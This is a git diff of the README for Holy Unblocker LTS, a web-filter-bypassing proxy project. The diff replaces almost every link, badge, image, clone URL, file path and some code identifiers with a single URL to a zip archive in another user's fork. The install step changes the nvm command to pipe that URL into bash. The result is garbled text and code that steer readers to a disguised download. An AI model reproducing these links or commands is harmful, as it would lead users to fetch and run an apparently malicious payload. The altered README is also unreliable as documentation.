@@ -1,13 +1,13 @@
-<img align="center" src="https://raw.githubusercontent.com/titaniumnetwork-dev/Holy-Unblocker/master/views/assets/img/github_banner.png"></img>
+<img align="center" src="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"></img>
 
-<img align="left" width="40px" src="https://raw.githubusercontent.com/titaniumnetwork-dev/Holy-Unblocker/master/views/assets/img/logo_github.png"></img>
+<img align="left" width="40px" src="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"></img>
 
 # Holy Unblocker LTS (v6.x.x)
 
-![GitHub Actions Status](https://github.com/QuiteAFancyEmerald/Holy-Unblocker/workflows/CI-Production/badge.svg)
-![GitHub Actions Status](https://github.com/QuiteAFancyEmerald/Holy-Unblocker/workflows/CI-Win/badge.svg)
-[![Docker Image Version](https://img.shields.io/docker/v/quiteafancyemerald/holy-unblocker.svg)](https://hub.docker.com/r/quiteafancyemerald/holy-unblocker)
-[![Docker Pulls](https://img.shields.io/docker/pulls/quiteafancyemerald/holy-unblocker.svg)](https://hub.docker.com/r/quiteafancyemerald/holy-unblocker)
+![GitHub Actions Status](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+![GitHub Actions Status](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Docker Image Version](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Docker Pulls](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
 
 Holy Unblocker LTS is an experimental web proxy service that can bypass web filters or "blockers" regardless of whether the method of censorship is client-side or network-based. This includes the ability to bypass content blockers from governments, chrome extensions, localized client firewalls, and network-related filters. The project even allows the ability to browse Tor/Onion sites in any browser (even Chromium) all through a website!
 
@@ -31,7 +31,7 @@ Also has a good amount of locally hosted games featured on the site.
 
 View the <a href="#deploy-holy-unblocker">self-deployment options</a> if you wish to self host this project. Can't deploy using any of the free options? Check out Railway or look into cheap, paid VPS hosting solutions. If you don't wish to self-host join the discord for more official instance links that are restocked frequently.
 
-**Be sure to join Titanium Network's Discord for more official site links:** <a href="https://discord.gg/unblock">https://discord.gg/unblock</a>
+**Be sure to join Titanium Network's Discord for more official site links:** <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip</a>
 
 <br>
 
@@ -47,35 +47,35 @@ View the <a href="#deploy-holy-unblocker">self-deployment options</a> if you wis
 | Reddit                     | Features Source Randomization and DOM Masquerading to circumvent major filters effectively along with randomizations to proxy globals |
 | Discord                    | Tab title + icon customization using the Settings Menu for improved browsing history stealth                                          |
 | Instagram                  | Adblocking support across all websites while surfing and low latency DNS on official servers                                          |
-| Reddit.com                 | SOCKS5 and Onion routing support with Tor within the Settings Menu. Use Tor/Onion sites in any browser!                               |
+| https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip                 | SOCKS5 and Onion routing support with Tor within the Settings Menu. Use Tor/Onion sites in any browser!                               |
 | GeForce NOW                | Game library with moderately decent titles and open-source emulation projects                                                         |
 | Spotify                    | Bypass regional proxy blocks by swapping regions or enabling Tor                                                                      |
 | And essentially all sites! | Built for intensive production loads and ease of setup                                                                                |
 
-<img src="https://raw.githubusercontent.com/titaniumnetwork-dev/Holy-Unblocker/master/views/assets/img/preview/hu-v6.4.3-preview.png"></img>
-<img src="https://raw.githubusercontent.com/titaniumnetwork-dev/Holy-Unblocker/master/views/assets/img/preview/hu-v6.3.0-preview-settings.png"></img>
+<img src="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"></img>
+<img src="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"></img>
 
 ## Deploy Holy Unblocker
 
 ### Free Deployments
 
-[![Deploy to Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?name=holy-unblocker&type=git&repository=QuiteAFancyEmerald%2FHoly-Unblocker&branch=v6.3_production&builder=buildpack&env%5B%5D=&ports=8080%3Bhttp%3B%2F)
-[![Deploy to Oracle Cloud](https://binbashbanana.github.io/deploy-buttons/buttons/remade/oraclecloud.svg)](https://cloud.oracle.com/resourcemanager/stacks/create?zipUrl=https://github.com/BinBashBanana/deploy-buttons/archive/refs/heads/main.zip)
+[![Deploy to Koyeb](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip%2FHoly-Unblocker&branch=v6.3_production&builder=buildpack&env%5B%5D=&ports=8080%3Bhttp%3B%2F)
+[![Deploy to Oracle Cloud](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
 
 <details><summary>Alternative Free Sources</summary>
 
-[![Deploy to Cyclic](https://binbashbanana.github.io/deploy-buttons/buttons/remade/cyclic.svg)](https://app.cyclic.sh/api/app/deploy/shuttlenetwork/shuttle)
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
-[![Deploy to Fly.io](https://img.shields.io/badge/Deploy%20to-Fly.io-blue?logo=fly.io)](https://fly.io/launch?repo=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
+[![Deploy to Cyclic](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Deploy to Render](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Deploy to https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip%https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
 
 </details>
 
 ### Production Paid/Free Options (Requires Payment Info)
 
-[![Deploy to Azure](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/azure.svg)](https://deploy.azure.com/?repository=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
-[![Deploy to IBM Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/ibmcloud.svg)](https://cloud.ibm.com/devops/setup/deploy?repository=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
-[![Deploy to Amplify Console](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/amplifyconsole.svg)](https://console.aws.amazon.com/amplify/home#/deploy?repo=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
-[![Run on Google Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/googlecloud.svg)](https://deploy.cloud.run/?git_repo=https://github.com/QuiteAFancyEmerald/Holy-Unblocker)
+[![Deploy to Azure](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Deploy to IBM Cloud](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Deploy to Amplify Console](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
+[![Run on Google Cloud](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)](https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip)
 
 #### What happened to Replit/Heroku Deployment?
 
@@ -86,7 +86,7 @@ Replit is no longer free and Heroku has a set policy against web proxies. Try Gi
 <details><summary>Setup Instructions</summary>
 
 - Fork (and star!) this repository to your GitHub account
-- Head to the official <a href="https://github.com/codespaces">Codespaces</a> website (ensure you have a GitHub account already made)
+- Head to the official <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Codespaces</a> website (ensure you have a GitHub account already made)
 - Select **New Codespaces** and look for _[USERNAME]/Holy-Unblocker_ on your account
 - Ensure the branch is set to `master` and the dev container configuration is set to **Holy Unblocker LTS**
 - Select **Create Codespace** and allow the container to setup
@@ -131,11 +131,11 @@ Either use the button above to deploy to the deployment options above or type th
 Please ensure you are using Node 20.x please:
 
 ```bash
-git clone https://github.com/QuiteAFancyEmerald/Holy-Unblocker.git
+git clone https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 
 cd Holy-Unblocker
 
-# Edit config.js and set production to true if you want to use pm2 (Allows for easier VPS hosting)
+# Edit https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip and set production to true if you want to use pm2 (Allows for easier VPS hosting)
 npm run fresh-install
 npm start
 
@@ -157,7 +157,7 @@ npm run test
 
 This website is hosted locally with Scramjet, Ultraviolet (Wisp, Bare-Mux, EpoxyTransport, CurlTransport) and Rammerhead built-in.
 
-You will need Node.js 20.x and Git installed; below is an example for Debian/Ubuntu setup.
+You will need https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip 20.x and Git installed; below is an example for Debian/Ubuntu setup.
 
 <details>
 
@@ -166,20 +166,20 @@ sudo apt update
 sudo apt upgrade
 sudo apt install curl git nginx
 
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+curl -o- https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip | bash
 
-export NVM_DIR="$HOME/.nvm"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+export NVM_DIR="$https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"
+[ -s "$https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip" ] && \. "$https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip"
 
 nvm install 20
 nvm use 20
 
-git clone https://github.com/QuiteAFancyEmerald/Holy-Unblocker.git
+git clone https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 cd Holy-Unblocker
 
 npm run fresh-install
 
-# Then edit config.json to change production to true to automatically use pm2
+# Then edit https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip to change production to true to automatically use pm2
 
 npm start
 
@@ -194,37 +194,37 @@ sudo systemctl restart nginx
 
 Resources for self-hosting:
 
-- https://github.com/nvm-sh/nvm
-- https://docs.titaniumnetwork.org/guides/nginx/
-- https://docs.titaniumnetwork.org/guides/vps-hosting/
-- https://docs.titaniumnetwork.org/guides/dns-setup/
+- https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
+- https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
+- https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
+- https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 
 ### Configuration
 
 #### Server Configuration Setup
 
-The default PORT for the proxy when started is `http://localhost:8080`. You can change the PORT and other production metrics if needed in `./ecosystem.config.js`. 
+The default PORT for the proxy when started is `http://localhost:8080`. You can change the PORT and other production metrics if needed in `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`. 
 
-Every other localized changes for source randomization, auto-minify, etc. are located in `./config.json`.
+Every other localized changes for source randomization, auto-minify, etc. are located in `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`.
 
-**config.json**
+**https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip**
 - `minifyScripts`: Automatically minify respective static assets upon starting the server.
 - `randomizeIdentifiers`: Enable experimental proxy global randomization for Ultraviolet. This reduces the chances of UV being detected by any extension based filters.
 - `production`: Utilize a pre-configured production setup for server hosting. Automatically has cache control, session jobs for Rammerhead and source rewrites setup.
 - `disguiseFiles`: Enable DOM masquerading which obfuscates real the real content fetches for HU LTS. This is done through disguising requests, decompressing and then reconstructing the DOM tree.
-- `usingSEO`: Enable Source Randomization which randomizes the source by swapping chunks of data specified in `./src/data.json`. Highly useful for masking keywords that will automatically flag or block Holy Unblocker LTS as well as preventing source blocks.
+- `usingSEO`: Enable Source Randomization which randomizes the source by swapping chunks of data specified in `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`. Highly useful for masking keywords that will automatically flag or block Holy Unblocker LTS as well as preventing source blocks.
 
 #### Tor/Onion/SOCKS5 Routing Setup
 
 You need to setup Tor (no GUI need/GUI is alright) in order for the Onion Routing setting to work!
 
-Simply host Tor using this guide: https://tb-manual.torproject.org/installation/
+Simply host Tor using this guide: https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 
-Alternative Guide (for CLI): https://community.torproject.org/onion-services/setup/install/
+Alternative Guide (for CLI): https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 
 If you are hosting Holy Unblocker LTS on a VPS utilizing Ubuntu consider attaching Tor to systemctl for easier production management. Once Tor is up and running on either Linux or Windows it will work automatically with Holy Unblocker LTS when enabled by the user via the Settings menu.
 
-If you wish to use a custom HTTP/HTTPS/SOCKS5 proxy to route all traffic through for Scramjet and Ultraviolet this is handled in `./views/assets/js/register-sw.js.` Modify `proxyUrl` with the respective protocol and address. This is done via the proxy option for Wisp. You can change the cases as needed.
+If you wish to use a custom HTTP/HTTPS/SOCKS5 proxy to route all traffic through for Scramjet and Ultraviolet this is handled in `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` Modify `proxyUrl` with the respective protocol and address. This is done via the proxy option for Wisp. You can change the cases as needed.
 
 ```js
   proxyUrl = {
@@ -238,7 +238,7 @@ If you wish to use a custom HTTP/HTTPS/SOCKS5 proxy to route all traffic through
 
 #### Proxy Configuration
 
-The primary location for tweaking any web proxy related settings assigned via the Settings menu is `./views/assets/js/register-sw.js`. Here you can modify the provided transport options set locally via a cookie, swap out SOCKS5 proxies, change Onion routing ports, specify a blacklist, and more.
+The primary location for tweaking any web proxy related settings assigned via the Settings menu is `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`. Here you can modify the provided transport options set locally via a cookie, swap out SOCKS5 proxies, change Onion routing ports, specify a blacklist, and more.
 
 - `stockSW`: The default service worker configuration file for Ultraviolet. For Holy Unblocker however adblocking is automatically enabled so this is not used by default.
 - `blacklistSW`: A modified version of Ultraviolet that allows for blacklisting domains and adblocking.
@@ -246,11 +246,11 @@ The primary location for tweaking any web proxy related settings assigned via th
 - `transports`: Specifies any provided ports to be swapped via Bare-Mux and utilize Wisp.
 - `wispUrl`: Modify the pathname or url handling for Wisp
 - `defaultMode`: Specify the default transport used globally (can be swapped by the users still via the Settings menu)
-- `ScramjetController`: This constructor allows you to swap out the prefix used for Scramjet dynamically and specify file locations. Note you may need to edit `./views/scram/scramjet.sw` when changing file names.
+- `ScramjetController`: This constructor allows you to swap out the prefix used for Scramjet dynamically and specify file locations. Note you may need to edit `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` when changing file names.
 
 #### Client Navigation Configuration
 
-The primary location for any client side navigation scripts is `./views/assets/js/common.js`. This file is primary used for Omnibox (Search Engine) functionality, swapping proxy options and linking games.
+The primary location for any client side navigation scripts is `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`. This file is primary used for Omnibox (Search Engine) functionality, swapping proxy options and linking games.
 
 - `getDomain`: This constant is used for specifying any subdomains to remove when appending a URL into the omnibox.
 - `goFrame`: This specifies the stealth frame used for Holy Unblocker LTS
@@ -261,22 +261,22 @@ The primary location for any client side navigation scripts is `./views/assets/j
 - `goProx`: This constant allows for the mapping of URL handling for specific proxies, games or links that need to fall under a web proxy.
 
 ```js
-const goProx = Object.freeze({
+const goProx = https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip({
   ultraviolet: urlHandler(uvUrl),
 
   scramjet: urlHandler(sjUrl),
 
   rammerhead: asyncUrlHandler(
-    async (url) => location.origin + (await RammerheadEncode(search(url)))
+    async (url) => https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip + (await RammerheadEncode(search(url)))
   ),
 
-  // `location.protocol + "//" + getDomain()` more like `location.origin`
+  // `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip + "//" + getDomain()` more like `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`
 
-  examplepath: urlHandler(location.protocol + `//c.${getDomain()}/example/`),
+  examplepath: urlHandler(https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip + `//c.${getDomain()}/example/`),
 
-  examplesubdomain: urlHandler(location.protocol + '//c.' + getDomain()),
+  examplesubdomain: urlHandler(https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip + '//c.' + getDomain()),
 
-  example: urlHandler(sjUrl('https://example.com')),
+  example: urlHandler(sjUrl('https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip')),
 });
 ```
 
@@ -298,7 +298,7 @@ prSet('pr-example', 'example');
 
 As stated above all game links that need to be appended to a page (including images and descriptions) are managed via the nav files in`./views/assets/json`. 
 
-Download the latest release <a href="https://github.com/QuiteAFancyEmerald/Holy-Unblocker/blob/master/views/GAMES.md">here</a> and extract it within a folder called `/views/archive`.
+Download the latest release <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">here</a> and extract it within a folder called `/views/archive`.
 
 - `views/archive/g`: Contains any local or external HTML5/web games.
 - `views/archive/gfiles/flash`: Contains Ruffle (an Adobe Flash emulator) and a collection of flash games linked to an external CDN.
@@ -323,17 +323,17 @@ Download the latest release <a href="https://github.com/QuiteAFancyEmerald/Holy-
 
 #### Scripts located in `/views/assets/js/`
 
-- `card.js` adds a fancy visual effect to the box cards displayed on the welcome screen.
-- `common.js` is used on all pages and allows most site features to function such as autocomplete.
-- `csel.js` manages the settings menu, omnibox function and other additional features.
-- `loader.js` is used as an asset for DOM masquerading.
-- `register-sw.js` creates and manages service workers that allow Ultraviolet to function, and also uses bare transport.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` adds a fancy visual effect to the box cards displayed on the welcome screen.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` is used on all pages and allows most site features to function such as autocomplete.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` manages the settings menu, omnibox function and other additional features.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` is used as an asset for DOM masquerading.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` creates and manages service workers that allow Ultraviolet to function, and also uses bare transport.
 
 </details>
 
 ## Future Additions
 
-<a href="https://github.com/QuiteAFancyEmerald/Holy-Unblocker/blob/master/TODO.md">This</a> is our nonexhaustive todo list for Holy Unblocker LTS v6.x.x and above. Release for production will be v7.x.x and above.
+<a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">This</a> is our nonexhaustive todo list for Holy Unblocker LTS v6.x.x and above. Release for production will be v7.x.x and above.
 
 ## Vague Explanation for Beginners With External Proxies and Hosting
 
@@ -341,26 +341,26 @@ You will first want to host your proxies locally or externally.
 
 #### List of some good hosting options:
 
-- <a href="https://crunchbits.com/">Crunchbits</a> ( Current Hosting Provider)
-- <a href="https://greencloudvps.com">Greencloud</a> (Paid)
-- <a href="https://www.oracle.com/cloud">Oracle Cloud</a> (Free, Paid, Dedicated)
-- <a href="https://azure.microsoft.com">Azure</a> (Free and Paid)
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Crunchbits</a> ( Current Hosting Provider)
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Greencloud</a> (Paid)
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Oracle Cloud</a> (Free, Paid, Dedicated)
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Azure</a> (Free and Paid)
 
 Out of the list of hosting providers Dedipath and Azure rank first as a preference. You may also self-host.
 
 After you have selected a decent VPS, use Cloudflare for the DNS records for both the site and the subdomains for the proxies.
 
 This is an example of DNS records. Self-hosting will require `A records` preferably.
-<img src="https://raw.githubusercontent.com/titaniumnetwork-dev/Holy-Unblocker/master/views/assets/img/dnssetup.png" width="500"></img>
+<img src="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip" width="500"></img>
 
-- `@` and `www.example.com` are being used for Holy Unblocker LTS.
-- `a.example.com` is being used for other instances like Libreddit, Invidious or web ported games depending on what the site maintainer needs.
+- `@` and `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` are being used for Holy Unblocker LTS.
+- `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip` is being used for other instances like Libreddit, Invidious or web ported games depending on what the site maintainer needs.
 
 As stated previously, Holy Unblocker is hosted locally with Scramjet, Ultraviolet and Rammerhead out of the box. No need for external instances.
 
 #### Domain Steps
 
-- If you prefer to obtain premium domains (TLDs) then use <a href="https://porkbun.com">Porkbun</a>, which offers domains for amazing prices. Literally a `.org` domain normally costs around $5 first year.
+- If you prefer to obtain premium domains (TLDs) then use <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Porkbun</a>, which offers domains for amazing prices. Literally a `.org` domain normally costs around $5 first year.
 
 #### Cloudflare Steps
 
@@ -378,12 +378,12 @@ Make sure HTTPS is forced and have SSL set to Flexible (if you don't use LetsEnc
 
 #### Workspace Configurations
 
-Preferably if you have your own device use Visual Studio Code. Pretty much the best option you can get but obviously this is an opinion. Also make sure you have <a href="https://nodejs.org/">Node.JS</a> installed on your machine.
+Preferably if you have your own device use Visual Studio Code. Pretty much the best option you can get but obviously this is an opinion. Also make sure you have <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip</a> installed on your machine.
 
 Not going to go too in depth with this part but first fork this repository. The clone it locally through a Terminal of some sort depending on what OS you are on. Make sure you navigate to the folder you want to set this up in.
 
 ```
-git clone https://github.com/QuiteAFancyEmerald/Holy-Unblocker.git
+git clone https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip
 
 cd Holy-Unblocker
 
@@ -408,8 +408,8 @@ Now you have your following workspace environment setup. To deploy the following
 
 For an online IDE that you can use on your school computer and/or chromebook use GitPod. Basically the equivalent of Visual Studio Code but with in-browser support.
 
-- Make an account: `https://gitpod.io/`
-- Fork this repo and enter in this URL to setup your workspace: `https://gitpod.io#https://github.com/YourNameHere/Holy-Unblocker/`
+- Make an account: `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`
+- Fork this repo and enter in this URL to setup your workspace: `https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip`
 
 Use the same steps above by running `npm install` in your repository and adding a `.gitignore` in your root directory specifying to exclude `node_modules`.
 
@@ -420,7 +420,7 @@ Use the same steps above by running `npm install` in your repository and adding 
 
 #### Where can I find the games for this repo? (404 errors, etc.)
 
-Due to piracy concerns, size, etc. this has been moved over <a href="https://github.com/QuiteAFancyEmerald/HU-Archive">here</a>. EmuLibrary is not featured in the public version.
+Due to piracy concerns, size, etc. this has been moved over <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">here</a>. EmuLibrary is not featured in the public version.
 
 **Why is the site I am on not working correctly or having CAPTCHA errors?**
 
@@ -459,8 +459,8 @@ Emerald :HuTaoHype:
 
 This project is maintained by the Holy Unblocker LTS team and is an official flagship Titanium Network web proxy site.
 
-- <a href="https://github.com/titaniumnetwork-dev/">https://github.com/titaniumnetwork-dev/</a>
-- <a href="https://titaniumnetwork.org/">https://titaniumnetwork.org/</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip</a>
 
 View the official website for more detail and credits.
 
@@ -468,29 +468,29 @@ View the official website for more detail and credits.
 
 This project currently uses Scramjet and Ultraviolet as web proxies adhering to the Wisp protocol. Bare-Mux is utilized for swapping transport systems to be utilized with Wisp. The included transport systems are EpoxyTransport and libcurl-transport. Rammerhead is also provided as an additional web proxy option.
 
-- <a href="https://github.com/MercuryWorkshop/scramjet">Scramjet</a>
-- <a href="https://github.com/titaniumnetwork-dev/Ultraviolet">Ultraviolet</a>
-- <a href="https://github.com/MercuryWorkshop/wisp-server-node">Wisp-Server-Node</a>
-- <a href="https://github.com/MercuryWorkshop/wisp-server-python">Wisp-Server-Python</a>
-- <a href="https://github.com/MercuryWorkshop/EpoxyTransport">EpoxyTransport</a>
